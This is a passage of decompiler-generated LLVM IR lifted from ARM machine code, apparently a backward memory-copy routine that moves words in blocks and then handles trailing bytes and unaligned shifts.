  %v11_15e50 = inttoptr i32 %v10_15e50 to i32*
  %v12_15e50 = load i32, i32* %v11_15e50, align 4
  store i32 %v12_15e50, i32* %lr.global-to-local, align 4
  store i32 %v10_15e50, i32* %r1.global-to-local, align 4
  %v1_15e54 = add i32 %v0_15e54, -16
  %v2_15e54 = inttoptr i32 %v1_15e54 to i32*
  store i32 %v3_15e50, i32* %v2_15e54, align 4
  %v4_15e54 = add i32 %v0_15e54, -12
  %v5_15e54 = inttoptr i32 %v4_15e54 to i32*
  %v6_15e54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15e54, i32* %v5_15e54, align 4
  %v7_15e54 = add i32 %v0_15e54, -8
  %v8_15e54 = inttoptr i32 %v7_15e54 to i32*
  %v9_15e54 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15e54, i32* %v8_15e54, align 4
  %v10_15e54 = add i32 %v0_15e54, -4
  %v11_15e54 = inttoptr i32 %v10_15e54 to i32*
  %v12_15e54 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15e54, i32* %v11_15e54, align 4
  store i32 %v1_15e54, i32* %r0.global-to-local, align 4
  %v0_15e58 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e58 = add i32 %v0_15e58, -4
  %v2_15e58 = inttoptr i32 %v1_15e58 to i32*
  %v3_15e58 = load i32, i32* %v2_15e58, align 4
  store i32 %v3_15e58, i32* %r3.global-to-local, align 4
  %v4_15e58 = add i32 %v0_15e58, -8
  %v5_15e58 = inttoptr i32 %v4_15e58 to i32*
  %v6_15e58 = load i32, i32* %v5_15e58, align 4
  store i32 %v6_15e58, i32* %r4.global-to-local, align 4
  %v7_15e58 = add i32 %v0_15e58, -12
  %v8_15e58 = inttoptr i32 %v7_15e58 to i32*
  %v9_15e58 = load i32, i32* %v8_15e58, align 4
  store i32 %v9_15e58, i32* %ip.global-to-local, align 4
  %v10_15e58 = add i32 %v0_15e58, -16
  %v11_15e58 = inttoptr i32 %v10_15e58 to i32*
  %v12_15e58 = load i32, i32* %v11_15e58, align 4
  store i32 %v12_15e58, i32* %lr.global-to-local, align 4
  store i32 %v10_15e58, i32* %r1.global-to-local, align 4
  %v1_15e5c = add i32 %v0_15e54, -32
  %v2_15e5c = inttoptr i32 %v1_15e5c to i32*
  store i32 %v3_15e58, i32* %v2_15e5c, align 4
  %v4_15e5c = add i32 %v0_15e54, -28
  %v5_15e5c = inttoptr i32 %v4_15e5c to i32*
  %v6_15e5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15e5c, i32* %v5_15e5c, align 4
  %v7_15e5c = add i32 %v0_15e54, -24
  %v8_15e5c = inttoptr i32 %v7_15e5c to i32*
  %v9_15e5c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15e5c, i32* %v8_15e5c, align 4
  %v10_15e5c = add i32 %v0_15e54, -20
  %v11_15e5c = inttoptr i32 %v10_15e5c to i32*
  %v12_15e5c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15e5c, i32* %v11_15e5c, align 4
  store i32 %v1_15e5c, i32* %r0.global-to-local, align 4
  %v0_15e60 = load i32, i32* %r2.global-to-local, align 4
  %v2_15e60 = add i32 %v0_15e60, -32
  store i32 %v2_15e60, i32* %r2.global-to-local, align 4
  %v6_15e64 = icmp slt i32 %v0_15e60, 32
  br i1 %v6_15e64, label %dec_label_pc_15e68.loopexit, label %dec_label_pc_15e50.dec_label_pc_15e50_crit_edge

dec_label_pc_15e50.dec_label_pc_15e50_crit_edge:  ; preds = %dec_label_pc_15e50
  %v0_15e50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e50

dec_label_pc_15e68.loopexit:                      ; preds = %dec_label_pc_15e50
  %v4_15e60 = sub i32 31, %v0_15e60
  %v5_15e60 = and i32 %v4_15e60, %v0_15e60
  %v6_15e60 = icmp slt i32 %v5_15e60, 0
  %v7_15e60 = icmp slt i32 %v2_15e60, 0
  store i1 %v6_15e60, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15e60, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15e68

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15e68.loopexit, %dec_label_pc_15e44
  %v6_15e70 = phi i32 [ %v1_15e5c, %dec_label_pc_15e68.loopexit ], [ %v0_15e5449, %dec_label_pc_15e44 ]
  %v0_15e78.pr = phi i32 [ %v2_15e60, %dec_label_pc_15e68.loopexit ], [ %v2_15e48, %dec_label_pc_15e44 ]
  %v4_15e68 = add i32 %v0_15e78.pr, 16
  %v6_15e68 = sub i32 0, %v0_15e78.pr
  %v7_15e68 = and i32 %v4_15e68, %v6_15e68
  %v8_15e68 = icmp slt i32 %v7_15e68, 0
  store i1 %v8_15e68, i1* %cpsr_v.global-to-local, align 1
  %v9_15e68 = icmp slt i32 %v4_15e68, 0
  store i1 %v9_15e68, i1* %cpsr_n.global-to-local, align 1
  %v5_15e6c = icmp slt i32 %v0_15e78.pr, -16
  br i1 %v5_15e6c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_15e68
  %v6_15e6c = load i32, i32* %r1.global-to-local, align 4
  %v7_15e6c = add i32 %v6_15e6c, -4
  %v8_15e6c = inttoptr i32 %v7_15e6c to i32*
  %v9_15e6c = load i32, i32* %v8_15e6c, align 4
  store i32 %v9_15e6c, i32* %r3.global-to-local, align 4
  %v10_15e6c = add i32 %v6_15e6c, -8
  %v11_15e6c = inttoptr i32 %v10_15e6c to i32*
  %v12_15e6c = load i32, i32* %v11_15e6c, align 4
  store i32 %v12_15e6c, i32* %r4.global-to-local, align 4
  %v13_15e6c = add i32 %v6_15e6c, -12
  %v14_15e6c = inttoptr i32 %v13_15e6c to i32*
  %v15_15e6c = load i32, i32* %v14_15e6c, align 4
  store i32 %v15_15e6c, i32* %ip.global-to-local, align 4
  %v16_15e6c = add i32 %v6_15e6c, -16
  %v17_15e6c = inttoptr i32 %v16_15e6c to i32*
  %v18_15e6c = load i32, i32* %v17_15e6c, align 4
  store i32 %v18_15e6c, i32* %lr.global-to-local, align 4
  store i32 %v16_15e6c, i32* %r1.global-to-local, align 4
  %v7_15e70 = add i32 %v6_15e70, -16
  %v8_15e70 = inttoptr i32 %v7_15e70 to i32*
  store i32 %v9_15e6c, i32* %v8_15e70, align 4
  %v10_15e70 = add i32 %v6_15e70, -12
  %v11_15e70 = inttoptr i32 %v10_15e70 to i32*
  %v12_15e70 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15e70, i32* %v11_15e70, align 4
  %v13_15e70 = add i32 %v6_15e70, -8
  %v14_15e70 = inttoptr i32 %v13_15e70 to i32*
  %v15_15e70 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v15_15e70, i32* %v14_15e70, align 4
  %v16_15e70 = add i32 %v6_15e70, -4
  %v17_15e70 = inttoptr i32 %v16_15e70 to i32*
  %v18_15e70 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15e70, i32* %v17_15e70, align 4
  store i32 %v7_15e70, i32* %r0.global-to-local, align 4
  %v6_15e74 = load i32, i32* %r2.global-to-local, align 4
  %v7_15e74 = add i32 %v6_15e74, -16
  store i32 %v7_15e74, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15e68, %bb140
  %v6_15e80 = phi i32 [ %v7_15e70, %bb140 ], [ %v6_15e70, %dec_label_pc_15e68 ]
  %v0_15e78 = phi i32 [ %v7_15e74, %bb140 ], [ %v0_15e78.pr, %dec_label_pc_15e68 ]
  %v4_15e78 = add i32 %v0_15e78, 20
  store i32 %v4_15e78, i32* %r2.global-to-local, align 4
  %v6_15e78 = sub i32 0, %v0_15e78
  %v7_15e78 = and i32 %v4_15e78, %v6_15e78
  %v8_15e78 = icmp slt i32 %v7_15e78, 0
  store i1 %v8_15e78, i1* %cpsr_v.global-to-local, align 1
  %v9_15e78 = icmp slt i32 %v4_15e78, 0
  store i1 %v9_15e78, i1* %cpsr_n.global-to-local, align 1
  %v5_15e7c = icmp slt i32 %v0_15e78, -20
  br i1 %v5_15e7c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_15e7c = load i32, i32* %r1.global-to-local, align 4
  %v7_15e7c = add i32 %v6_15e7c, -4
  %v8_15e7c = inttoptr i32 %v7_15e7c to i32*
  %v9_15e7c = load i32, i32* %v8_15e7c, align 4
  store i32 %v9_15e7c, i32* %r3.global-to-local, align 4
  %v10_15e7c = add i32 %v6_15e7c, -8
  %v11_15e7c = inttoptr i32 %v10_15e7c to i32*
  %v12_15e7c = load i32, i32* %v11_15e7c, align 4
  store i32 %v12_15e7c, i32* %ip.global-to-local, align 4
  %v13_15e7c = add i32 %v6_15e7c, -12
  %v14_15e7c = inttoptr i32 %v13_15e7c to i32*
  %v15_15e7c = load i32, i32* %v14_15e7c, align 4
  store i32 %v15_15e7c, i32* %lr.global-to-local, align 4
  store i32 %v13_15e7c, i32* %r1.global-to-local, align 4
  %v7_15e80 = add i32 %v6_15e80, -12
  %v8_15e80 = inttoptr i32 %v7_15e80 to i32*
  store i32 %v9_15e7c, i32* %v8_15e80, align 4
  %v10_15e80 = add i32 %v6_15e80, -8
  %v11_15e80 = inttoptr i32 %v10_15e80 to i32*
  %v12_15e80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_15e80, i32* %v11_15e80, align 4
  %v13_15e80 = add i32 %v6_15e80, -4
  %v14_15e80 = inttoptr i32 %v13_15e80 to i32*
  %v15_15e80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15e80, i32* %v14_15e80, align 4
  store i32 %v7_15e80, i32* %r0.global-to-local, align 4
  %v6_15e84 = load i32, i32* %r2.global-to-local, align 4
  %v7_15e84 = add i32 %v6_15e84, -12
  store i32 %v7_15e84, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_15ea457 = phi i32 [ %v6_15e80, %.thread14 ], [ %v7_15e80, %bb141 ]
  %v0_15e8c55 = phi i32 [ %v4_15e78, %.thread14 ], [ %v7_15e84, %bb141 ]
  %v2_15e88 = load i8*, i8** %stack_var_-8, align 4
  %v3_15e88 = ptrtoint i8* %v2_15e88 to i32
  store i32 %v3_15e88, i32* @r4, align 4
  store i32 %v8_15e44, i32* @lr, align 4
  br label %dec_label_pc_15e8c

dec_label_pc_15e8c:                               ; preds = %dec_label_pc_15e3c, %.thread16
  %v7_15e9c = phi i32 [ %v0_15e5449, %dec_label_pc_15e3c ], [ %v6_15ea457, %.thread16 ]
  %v0_15e8c = phi i32 [ %v2_15e3c, %dec_label_pc_15e3c ], [ %v0_15e8c55, %.thread16 ]
  %v2_15e8c = add i32 %v0_15e8c, 8
  store i32 %v2_15e8c, i32* %r2.global-to-local, align 4
  %v4_15e8c = sub i32 0, %v0_15e8c
  %v5_15e8c = and i32 %v2_15e8c, %v4_15e8c
  %v6_15e8c = icmp slt i32 %v5_15e8c, 0
  store i1 %v6_15e8c, i1* %cpsr_v.global-to-local, align 1
  %v7_15e8c = icmp slt i32 %v2_15e8c, 0
  store i1 %v7_15e8c, i1* %cpsr_n.global-to-local, align 1
  %v5_15e90 = icmp slt i32 %v0_15e8c, -8
  br i1 %v5_15e90, label %bb143, label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e8c
  %v6_15e94 = add i32 %v0_15e8c, 4
  store i32 %v6_15e94, i32* %r2.global-to-local, align 4
  %v8_15e94 = sub i32 -5, %v0_15e8c
  %v9_15e94 = and i32 %v8_15e94, %v2_15e8c
  %v10_15e94 = icmp slt i32 %v9_15e94, 0
  store i1 %v10_15e94, i1* %cpsr_v.global-to-local, align 1
  %v11_15e94 = icmp slt i32 %v6_15e94, 0
  store i1 %v11_15e94, i1* %cpsr_n.global-to-local, align 1
  %v5_15e98 = icmp slt i32 %v2_15e8c, 4
  %v6_15e98 = load i32, i32* %r1.global-to-local, align 4
  %v7_15e98 = add i32 %v6_15e98, -4
  %v8_15e98 = inttoptr i32 %v7_15e98 to i32*
  %v9_15e98 = load i32, i32* %v8_15e98, align 4
  store i32 %v9_15e98, i32* %r3.global-to-local, align 4
  br i1 %v5_15e98, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_15e94
  store i32 %v7_15e98, i32* %r1.global-to-local, align 4
  %v8_15e9c = add i32 %v7_15e9c, -4
  %v9_15e9c = inttoptr i32 %v8_15e9c to i32*
  store i32 %v9_15e98, i32* %v9_15e9c, align 4
  %v10_15e9c = load i32, i32* %r0.global-to-local, align 4
  %v11_15e9c = add i32 %v10_15e9c, -4
  store i32 %v11_15e9c, i32* %r0.global-to-local, align 4
  %v0_15eac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_15e94
  %v10_15ea0 = add i32 %v6_15e98, -8
  %v11_15ea0 = inttoptr i32 %v10_15ea0 to i32*
  %v12_15ea0 = load i32, i32* %v11_15ea0, align 4
  store i32 %v12_15ea0, i32* %ip.global-to-local, align 4
  store i32 %v10_15ea0, i32* %r1.global-to-local, align 4
  %v7_15ea4 = add i32 %v7_15e9c, -8
  %v8_15ea4 = inttoptr i32 %v7_15ea4 to i32*
  store i32 %v9_15e98, i32* %v8_15ea4, align 4
  %v10_15ea4 = add i32 %v7_15e9c, -4
  %v11_15ea4 = inttoptr i32 %v10_15ea4 to i32*
  %v12_15ea4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_15ea4, i32* %v11_15ea4, align 4
  store i32 %v7_15ea4, i32* %r0.global-to-local, align 4
  %v6_15ea8 = load i32, i32* %r2.global-to-local, align 4
  %v7_15ea8 = add i32 %v6_15ea8, -4
  store i32 %v7_15ea8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_15e8c, %dec_label_pc_15e1c, %dec_label_pc_16050, %dec_label_pc_15fe4, %dec_label_pc_15f78, %bb142
  %v2_15eb0 = phi i32 [ %v11_15e9c, %.thread20 ], [ %v0_15f4832, %.thread26 ], [ %v7_15e9c, %dec_label_pc_15e8c ], [ %v2_15e20, %dec_label_pc_15e1c ], [ %v2_15ebc65, %dec_label_pc_16050 ], [ %v2_15ebc64, %dec_label_pc_15fe4 ], [ %v2_15ebc63, %dec_label_pc_15f78 ], [ %v7_15ea4, %bb142 ]
  %v0_15eac = phi i32 [ %v0_15eac.pre, %.thread20 ], [ %v2_15ef0, %.thread26 ], [ %v2_15e8c, %dec_label_pc_15e8c ], [ %v2_15e24, %dec_label_pc_15e1c ], [ %v0_15eac61, %dec_label_pc_16050 ], [ %v0_15eac60, %dec_label_pc_15fe4 ], [ %v0_15eac59, %dec_label_pc_15f78 ], [ %v7_15ea8, %bb142 ]
  %v1_15eac = add i32 %v0_15eac, 4
  store i32 %v1_15eac, i32* @r2, align 4
  %v3_15eac = sub i32 0, %v0_15eac
  %v4_15eac = and i32 %v1_15eac, %v3_15eac
  %v5_15eac = icmp slt i32 %v4_15eac, 0
  store i1 %v5_15eac, i1* %cpsr_v.global-to-local, align 1
  %v6_15eac = icmp slt i32 %v1_15eac, 0
  store i1 %v6_15eac, i1* %cpsr_n.global-to-local, align 1
  %v7_15eac = icmp eq i32 %v1_15eac, 0
  store i1 %v7_15eac, i1* @cpsr_z, align 1
  br i1 %v7_15eac, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_15eb4 = add i32 %v0_15eac, 2
  %v3_15eb4 = sub i32 -3, %v0_15eac
  %v4_15eb4 = and i32 %v3_15eb4, %v1_15eac
  %v5_15eb4 = icmp slt i32 %v4_15eb4, 0
  store i1 %v5_15eb4, i1* %cpsr_v.global-to-local, align 1
  %v6_15eb4 = icmp slt i32 %v1_15eb4, 0
  store i1 %v6_15eb4, i1* %cpsr_n.global-to-local, align 1
  %v7_15eb4 = icmp eq i32 %v1_15eac, 2
  store i1 %v7_15eb4, i1* @cpsr_z, align 1
  %v0_15eb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15eb8 = add i32 %v0_15eb8, -1
  %v2_15eb8 = inttoptr i32 %v1_15eb8 to i8*
  %v3_15eb8 = load i8, i8* %v2_15eb8, align 1
  %v4_15eb8 = zext i8 %v3_15eb8 to i32
  store i32 %v4_15eb8, i32* %r3.global-to-local, align 4
  store i32 %v1_15eb8, i32* %r1.global-to-local, align 4
  %v3_15ebc = add i32 %v2_15eb0, -1
  %v4_15ebc = inttoptr i32 %v3_15ebc to i8*
  store i8 %v3_15eb8, i8* %v4_15ebc, align 1
  %v5_15ebc = load i32, i32* %r0.global-to-local, align 4
  %v6_15ebc = add i32 %v5_15ebc, -1
  store i32 %v6_15ebc, i32* %r0.global-to-local, align 4
  %v0_15ec0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15ec0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15ec0 = xor i1 %v0_15ec0, %v1_15ec0
  br i1 %v2_15ec0, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_15ec0 = load i32, i32* %r1.global-to-local, align 4
  %v4_15ec0 = add i32 %v3_15ec0, -1
  %v5_15ec0 = inttoptr i32 %v4_15ec0 to i8*
  %v6_15ec0 = load i8, i8* %v5_15ec0, align 1
  %v7_15ec0 = zext i8 %v6_15ec0 to i32
  store i32 %v7_15ec0, i32* %r3.global-to-local, align 4
  store i32 %v4_15ec0, i32* %r1.global-to-local, align 4
  %v6_15ec4 = add i32 %v5_15ebc, -2
  %v7_15ec4 = inttoptr i32 %v6_15ec4 to i8*
  store i8 %v6_15ec0, i8* %v7_15ec4, align 1
  %v8_15ec4 = load i32, i32* %r0.global-to-local, align 4
  %v9_15ec4 = add i32 %v8_15ec4, -1
  store i32 %v9_15ec4, i32* %r0.global-to-local, align 4
  %v1_15ec8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15ec8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_15ecc = phi i32 [ %v9_15ec4, %bb145 ], [ %v6_15ebc, %bb144 ]
  %v2_15ecc = phi i1 [ %v2_15ec8.pre, %bb145 ], [ %v1_15ec0, %bb144 ]
  %v1_15ecc = phi i1 [ %v1_15ec8.pre, %bb145 ], [ %v0_15ec0, %bb144 ]
  %v0_15ec8 = load i1, i1* @cpsr_z, align 1
  %v3_15ec8 = xor i1 %v2_15ecc, %v1_15ecc
  %v4_15ec8 = or i1 %v0_15ec8, %v3_15ec8
  br i1 %v4_15ec8, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_15ec8 = load i32, i32* %r1.global-to-local, align 4
  %v6_15ec8 = add i32 %v5_15ec8, -1
  %v7_15ec8 = inttoptr i32 %v6_15ec8 to i8*
  %v8_15ec8 = load i8, i8* %v7_15ec8, align 1
  %v9_15ec8 = zext i8 %v8_15ec8 to i32
  store i32 %v9_15ec8, i32* %r3.global-to-local, align 4
  store i32 %v6_15ec8, i32* %r1.global-to-local, align 4
  %v8_15ecc = add i32 %v7_15ecc, -1
  %v9_15ecc = inttoptr i32 %v8_15ecc to i8*
  store i8 %v8_15ec8, i8* %v9_15ecc, align 1
  %v10_15ecc = load i32, i32* %r0.global-to-local, align 4
  %v11_15ecc = add i32 %v10_15ecc, -1
  store i32 %v11_15ecc, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15e2c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15ed4 = icmp eq i32 %v1_15e2c, 1
  store i1 %v8_15ed4, i1* %cpsr_n.global-to-local, align 1
  %v1_15ed8 = add i32 %v2_15e1c, -1
  %v2_15ed8 = inttoptr i32 %v1_15ed8 to i8*
  %v3_15ed8 = load i8, i8* %v2_15ed8, align 1
  %v4_15ed8 = zext i8 %v3_15ed8 to i32
  store i32 %v4_15ed8, i32* %r3.global-to-local, align 4
  store i32 %v1_15ed8, i32* %r1.global-to-local, align 4
  %v3_15edc = add i32 %v2_15e20, -1
  %v4_15edc = inttoptr i32 %v3_15edc to i8*
  store i8 %v3_15ed8, i8* %v4_15edc, align 1
  %v5_15edc = load i32, i32* %r0.global-to-local, align 4
  %v6_15edc = add i32 %v5_15edc, -1
  store i32 %v6_15edc, i32* %r0.global-to-local, align 4
  br i1 %v8_15ed4, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_15ed4
  %v9_15ed4 = icmp eq i32 %v1_15e2c, 2
  %v6_15ee0 = load i32, i32* %r1.global-to-local, align 4
  %v7_15ee0 = add i32 %v6_15ee0, -1
  %v8_15ee0 = inttoptr i32 %v7_15ee0 to i8*
  %v9_15ee0 = load i8, i8* %v8_15ee0, align 1
  %v10_15ee0 = zext i8 %v9_15ee0 to i32
  store i32 %v10_15ee0, i32* %r3.global-to-local, align 4
  store i32 %v7_15ee0, i32* %r1.global-to-local, align 4
  %v9_15ee4 = add i32 %v5_15edc, -2
  %v10_15ee4 = inttoptr i32 %v9_15ee4 to i8*
  store i8 %v9_15ee0, i8* %v10_15ee4, align 1
  %v11_15ee4 = load i32, i32* %r0.global-to-local, align 4
  %v12_15ee4 = add i32 %v11_15ee4, -1
  store i32 %v12_15ee4, i32* %r0.global-to-local, align 4
  br i1 %v9_15ed4, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_15ee8 = load i32, i32* %r1.global-to-local, align 4
  %v9_15ee8 = add i32 %v8_15ee8, -1
  %v10_15ee8 = inttoptr i32 %v9_15ee8 to i8*
  %v11_15ee8 = load i8, i8* %v10_15ee8, align 1
  %v12_15ee8 = zext i8 %v11_15ee8 to i32
  store i32 %v12_15ee8, i32* %r3.global-to-local, align 4
  store i32 %v9_15ee8, i32* %r1.global-to-local, align 4
  %v11_15eec = add i32 %v11_15ee4, -2
  %v12_15eec = inttoptr i32 %v11_15eec to i8*
  store i8 %v11_15ee8, i8* %v12_15eec, align 1
  %v13_15eec = load i32, i32* %r0.global-to-local, align 4
  %v14_15eec = add i32 %v13_15eec, -1
  store i32 %v14_15eec, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_15ed4, %bb148
  %v0_15f4832 = phi i32 [ %v12_15ee4, %bb147 ], [ %v6_15edc, %dec_label_pc_15ed4 ], [ %v14_15eec, %bb148 ]
  %v0_15ef0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ef0 = load i32, i32* %ip.global-to-local, align 4
  %v2_15ef0 = sub i32 %v0_15ef0, %v1_15ef0
  store i32 %v2_15ef0, i32* %r2.global-to-local, align 4
  %v4_15ef0 = xor i32 %v1_15ef0, %v0_15ef0
  %v5_15ef0 = xor i32 %v2_15ef0, %v0_15ef0
  %v6_15ef0 = and i32 %v5_15ef0, %v4_15ef0
  %v7_15ef0 = icmp slt i32 %v6_15ef0, 0
  store i1 %v7_15ef0, i1* %cpsr_v.global-to-local, align 1
  %v8_15ef0 = icmp slt i32 %v2_15ef0, 0
  store i1 %v8_15ef0, i1* %cpsr_n.global-to-local, align 1
  %v5_15ef4 = icmp slt i32 %v0_15ef0, %v1_15ef0
  br i1 %v5_15ef4, label %bb143, label %dec_label_pc_15ef8

dec_label_pc_15ef8:                               ; preds = %.thread26
  %v0_15ef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ef8 = urem i32 %v0_15ef8, 4
  store i32 %v1_15ef8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15ef8 = icmp eq i32 %v1_15ef8, 0
  br i1 %v2_15ef8, label %dec_label_pc_15e3c, label %dec_label_pc_15f00

dec_label_pc_15f00:                               ; preds = %dec_label_pc_15e34, %dec_label_pc_15ef8
  %v0_15f4831 = phi i32 [ %v2_15e20, %dec_label_pc_15e34 ], [ %v0_15f4832, %dec_label_pc_15ef8 ]
  %v0_15ff4 = phi i32 [ %v2_15e24, %dec_label_pc_15e34 ], [ %v2_15ef0, %dec_label_pc_15ef8 ]
  %v0_15f00 = phi i32 [ %v2_15e1c, %dec_label_pc_15e34 ], [ %v0_15ef8, %dec_label_pc_15ef8 ]
  %v0_15f08 = phi i32 [ %v1_15e34, %dec_label_pc_15e34 ], [ %v1_15ef8, %dec_label_pc_15ef8 ]
  %v1_15f00 = and i32 %v0_15f00, -4
  store i32 %v1_15f00, i32* %r1.global-to-local, align 4
  %v1_15f04 = inttoptr i32 %v1_15f00 to i32*
  %v2_15f04 = load i32, i32* %v1_15f04, align 4
  store i32 %v2_15f04, i32* %r3.global-to-local, align 4
  %v7_15f08 = icmp ult i32 %v0_15f08, 2
  %v2_15fec = add i32 %v0_15ff4, -12
  %v4_15fec = sub i32 11, %v0_15ff4
  %v5_15fec = and i32 %v4_15fec, %v0_15ff4
  %v6_15fec = icmp slt i32 %v5_15fec, 0
  store i1 %v6_15fec, i1* %cpsr_v.global-to-local, align 1
  %v7_15fec = icmp slt i32 %v2_15fec, 0
  store i1 %v7_15fec, i1* %cpsr_n.global-to-local, align 1
  %v5_15ff0 = icmp slt i32 %v0_15ff4, 12
  br i1 %v7_15f08, label %dec_label_pc_15fec, label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15f00
  %v8_15f08 = icmp eq i32 %v0_15f08, 2
  br i1 %v8_15f08, label %dec_label_pc_15f80, label %dec_label_pc_15f14

dec_label_pc_15f14:                               ; preds = %dec_label_pc_15f10
  br i1 %v5_15ff0, label %dec_label_pc_15f60, label %dec_label_pc_15f1c

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f14
  store i32 %v2_15fec, i32* %r2.global-to-local, align 4
  %v3_15f20 = load i32, i32* @r4, align 4
  store i32 %v3_15f20, i32* %stack_var_-12, align 4
  %v6_15f20 = load i32, i32* @r5, align 4
  %v8_15f20 = inttoptr i32 %v6_15f20 to i8*
  store i8* %v8_15f20, i8** %stack_var_-8, align 4
  %v11_15f20 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15f24

dec_label_pc_15f24:                               ; preds = %dec_label_pc_15f24.dec_label_pc_15f24_crit_edge, %dec_label_pc_15f1c
  %v0_15f48 = phi i32 [ %v1_15f48, %dec_label_pc_15f24.dec_label_pc_15f24_crit_edge ], [ %v0_15f4831, %dec_label_pc_15f1c ]
  %v0_15f28 = phi i32 [ %v0_15f28.pre, %dec_label_pc_15f24.dec_label_pc_15f24_crit_edge ], [ %v1_15f00, %dec_label_pc_15f1c ]
  %v0_15f24 = phi i32 [ %v0_15f24.pre, %dec_label_pc_15f24.dec_label_pc_15f24_crit_edge ], [ %v2_15f04, %dec_label_pc_15f1c ]
  %v3_15f24 = mul i32 %v0_15f24, 256
  store i32 %v3_15f24, i32* %lr.global-to-local, align 4
  %v1_15f28 = add i32 %v0_15f28, -4
  %v2_15f28 = inttoptr i32 %v1_15f28 to i32*
  %v3_15f28 = load i32, i32* %v2_15f28, align 4
  store i32 %v3_15f28, i32* %r3.global-to-local, align 4
  %v4_15f28 = add i32 %v0_15f28, -8
  %v5_15f28 = inttoptr i32 %v4_15f28 to i32*
  %v6_15f28 = load i32, i32* %v5_15f28, align 4
  store i32 %v6_15f28, i32* %r4.global-to-local, align 4
  %v7_15f28 = add i32 %v0_15f28, -12
  %v8_15f28 = inttoptr i32 %v7_15f28 to i32*
  %v9_15f28 = load i32, i32* %v8_15f28, align 4
  store i32 %v9_15f28, i32* %r5.global-to-local, align 4
  %v10_15f28 = add i32 %v0_15f28, -16
  %v11_15f28 = inttoptr i32 %v10_15f28 to i32*
  %v12_15f28 = load i32, i32* %v11_15f28, align 4
  store i32 %v10_15f28, i32* %r1.global-to-local, align 4
  %v4_15f2c = udiv i32 %v12_15f28, 16777216
  %v5_15f2c = or i32 %v4_15f2c, %v3_15f24
  store i32 %v5_15f2c, i32* %lr.global-to-local, align 4
  %v3_15f30 = mul i32 %v12_15f28, 256
  %v4_15f34 = udiv i32 %v9_15f28, 16777216
  %v5_15f34 = or i32 %v3_15f30, %v4_15f34
  store i32 %v5_15f34, i32* %ip.global-to-local, align 4
  %v3_15f38 = mul i32 %v9_15f28, 256
  %v4_15f3c = udiv i32 %v6_15f28, 16777216
  %v5_15f3c = or i32 %v3_15f38, %v4_15f3c
  store i32 %v5_15f3c, i32* %r5.global-to-local, align 4
  %v3_15f40 = mul i32 %v6_15f28, 256
  %v4_15f44 = udiv i32 %v3_15f28, 16777216
  %v5_15f44 = or i32 %v3_15f40, %v4_15f44
  store i32 %v5_15f44, i32* %r4.global-to-local, align 4
  %v1_15f48 = add i32 %v0_15f48, -16
  %v2_15f48 = inttoptr i32 %v1_15f48 to i32*
  store i32 %v5_15f44, i32* %v2_15f48, align 4
  %v4_15f48 = add i32 %v0_15f48, -12
  %v5_15f48 = inttoptr i32 %v4_15f48 to i32*
  %v6_15f48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15f48, i32* %v5_15f48, align 4
  %v7_15f48 = add i32 %v0_15f48, -8
  %v8_15f48 = inttoptr i32 %v7_15f48 to i32*
  %v9_15f48 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15f48, i32* %v8_15f48, align 4
  %v10_15f48 = add i32 %v0_15f48, -4
  %v11_15f48 = inttoptr i32 %v10_15f48 to i32*
  %v12_15f48 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15f48, i32* %v11_15f48, align 4
  store i32 %v1_15f48, i32* %r0.global-to-local, align 4
  %v0_15f4c = load i32, i32* %r2.global-to-local, align 4
  %v2_15f4c = add i32 %v0_15f4c, -16
  store i32 %v2_15f4c, i32* %r2.global-to-local, align 4
